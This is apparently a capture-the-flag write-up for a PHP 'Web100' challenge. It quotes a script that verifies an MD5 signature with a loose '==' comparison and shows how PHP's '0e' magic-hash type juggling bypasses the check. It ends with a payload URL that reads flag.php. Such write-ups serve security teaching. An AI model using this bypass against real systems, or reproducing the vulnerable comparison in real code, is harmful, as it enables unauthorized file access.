Source code :

<?php
    function checksig($filename, $timestamp, $sig, $secretkey)
    {
        $realsig = substr(md5($filename.$timestamp.$secretkey),0,16);
        if ($sig == $realsig)
        {
            $filename = './'.str_replace('/','',$filename);
            readfile($filename);
            die(0);
        }
        echo "Invalid Signature!";
    }

$secretkey = "XXXXXXXXXXXXXXXXXXXXXXXXX";//This is not real $secretkey, ignore it !!!
echo "<html>
    <title>Web100</title>
    <body>
    <br>Dare to read flag.php???<br>
    <a href='web100.php?filename=test.php&timestamp=13371337&sig=d7a52c3ed325ef19'>Click me</a><br>
    </body>";
if (isset($_GET['filename'])&&isset($_GET['sig'])&&isset($_GET['timestamp']))
    {
        checksig($_GET['filename'],$_GET['timestamp'],$_GET['sig'], $secretkey);
        die(0);
    }
echo "Something's missing!!";
echo "</html>";
?>


Vul at:         $realsig = substr(md5($filename.$timestamp.$secretkey),0,16);
                  if ($sig == $realsig)

I thought it 's hash length attack but $secretkey at the last canot modified.
So, it isn't hash length attack.
In php 0e123456 = 0*10^123456= 0, so if ($sig == $realsig) return true if $sig=0 and $realsig= 0exxxxxx with xxxxxx is decimal.
So, payload = http://readfile.svattt.org:8888/web100.php?filename=flag.php&timestamp={fuzzing}&sig=0
U can fuzz with burpsuite or ur coding skill :D

finally payload:  http://readfile.svattt.org:8888/web100.php?filename=flag.php&timestamp=862&sig=0
